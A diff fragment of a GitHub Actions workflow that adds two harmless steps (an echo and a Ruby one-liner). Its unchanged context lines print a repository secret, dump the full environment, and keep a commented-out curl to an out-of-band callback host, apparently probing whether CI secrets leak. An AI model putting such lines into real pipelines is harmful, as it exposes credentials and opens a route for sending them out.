@@ -22,3 +22,7 @@ jobs:
           echo "${{ secrets.SEC2 }}"
           env
         #  curl https://lobqidjjcvgdsnkvjczfwug76zlf0vhyx.oast.fun/githubwf
+      - name: "My step 2"
+        run: echo Step 2
+      - name: "My ruby step"
+        run: ruby -e "puts 1"
